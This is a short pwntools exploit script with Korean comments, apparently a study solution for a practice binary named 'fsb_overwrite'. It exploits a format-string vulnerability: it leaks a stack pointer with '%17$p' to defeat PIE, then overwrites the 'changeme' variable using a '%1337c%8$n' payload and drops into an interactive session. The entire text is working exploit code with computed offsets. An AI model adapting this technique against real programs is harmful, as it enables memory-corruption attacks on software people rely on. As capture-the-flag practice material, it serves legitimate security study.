# 0x1290(작성자의 경우)
# 공부용이라 딱히 스켈레톤 코드 쓰진 않았음

# $rsp + 0x58에 위치해 있으므로
# 0x58 // 0x8 = 0xB
# rdi/
# rsi/rdx/rcx/r8/r9/rsp/rsp+8/...
# 0x6 + 0xb
# 17번째

from pwn import *

context.binary = elf = ELF('./fsb_overwrite')

def slog(n, a): return success(': '.join([n, hex(a)]))

p = process()

p.sendline(b'%17$p') # 주소 출력
pie = int(p.recvline().strip(), 16)
pie = pie - 0x1290
slog("pie_base", pie)

changeme = pie + elf.sym["changeme"]
slog("changeme", changeme)

pay = b'%1337c%8$n' # 6/7의 경계에 있으니 패딩 맞추고 8번째로 ㄱㄱ
pay = pay.ljust(16, b'A')
pay += p64(changeme)

print(pay)
p.sendline(pay)

p.interactive()